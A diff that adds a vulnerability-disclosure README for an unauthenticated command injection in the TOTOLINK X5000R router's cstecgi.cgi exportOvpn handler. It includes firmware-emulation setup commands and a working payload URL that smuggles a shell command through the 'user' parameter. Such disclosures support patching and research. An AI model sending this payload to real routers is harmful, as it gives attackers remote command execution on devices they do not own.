@@ -1,1 +1,27 @@
-# TOTOLINK_X5000R
+# TOTOLINK_X5000R_V9.1.0cu.2089_B20211224 RCE
+## file information
+
+firmware download address https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html
+
+## details
+<img src="./SCR-20251203-mtwb.png" width="500">
+A command injection vulnerability exists in the TOTOLINK X5000R wireless router.
+The CGI binary cstecgi.cgi contains improper input parsing logic, allowing remote attackers to execute arbitrary commands without authentication by abusing the exportOvpn handler.
+
+The vulnerability is triggered when user-controlled parameters are inserted into a shell command executed via system().
+
+```
+#after chroot
+#fake a openvpn-cert
+echo -e '#!/bin/sh\necho fake' > /bin/openvpn-cert
+chmod +x /bin/openvpn-cert
+```
+
+```
+payload = /cgi-bin/cstecgi.cgi?action=exportOvpn&type=user&user=test;id;
+```
+
+## results
+<img src="./FAF1B75F6D2ED72BB3F3037451055172.png" width="500">
+<img src="./FB4C4C31402C1B92D6F0C5C0B671656E.png" width="500">
+
